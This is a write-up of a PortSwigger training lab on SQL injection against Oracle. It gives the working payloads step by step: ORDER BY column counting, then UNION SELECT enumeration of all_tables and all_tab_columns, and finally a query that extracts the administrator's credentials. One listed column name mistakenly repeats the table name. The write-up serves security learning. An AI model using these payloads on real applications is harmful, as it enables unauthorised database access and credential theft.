# Write-up: SQL injection attack, listing the database contents on Oracle
Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle>  
Difficulty: PRACTITIONER  
 

## Lab description

![alt text](<img/1.png>)

## Steps

### Enumeration

In this lab, firstly we need to find the number of columns returned by the query. We are also unaware of the database type. Then we need to list the database tables and then a table that contains the user credentials and also the column names. Finally, we need to list the username and password of the administrator from this table.

To find the number of columns returned by the query, we can use the `ORDER BY` method. We will start with `ORDER BY 1` and increase the number until we get an error. This will give us the number of columns returned by the query. Using this we get error at `ORDER BY 3`, which means the number of columns is 2.

The link is like `/filter?category=Lifestyle'+ORDER+BY+3--`

sqli payload here is
```sql
' ORDER BY 3--
```

### Solution

Now, to list the database tables, we can use the `all_tables` table in oracle. The column `table_name` contains the table names. We can use the following link to list the tables.
`Lifestyle'+UNION+SELECT+table_name,'abc'+FROM+all_tables--`

The sqli payload will be
```sql
UNION SELECT table_name, 'abc' FROM all_tables
```

Above query gives a whole lot of tables. We can filter out the tables that contain the user credentials. 
After going through all tables found potential target `USERS_OXBEIB`.

Enumerating this table to find the column names, we can use the following link.
`Lifestyle'+UNION+SELECT+column_name,'abc'+FROM+all_tab_columns+WHERE+table_name='USERS_OXBEIB'--`

The sqli payload will be
```sql
UNION SELECT column_name,'abc' FROM all_tab_columns WHERE table_name='USERS_OXBEIB'
```

This gives the column names email, USERS_OXBEIB, PASSWORD_MKKHXL. Since we only need the username and password, we can use the following link.
`Lifestyle'+UNION+SELECT+USERNAME_OTBDNT,PASSWORD_MKKHXL+FROM+USERS_OXBEIB--`

The sqli payload will be
```sql
UNION SELECT USERNAME_OTBDNT, PASSWORD_MKKHXL FROM USERS_OXBEIB
```

This gives the username and password for `administrator` of the user and the last step is now to login as administrator. Hence, solves the lab.

![alt text](img/2.png)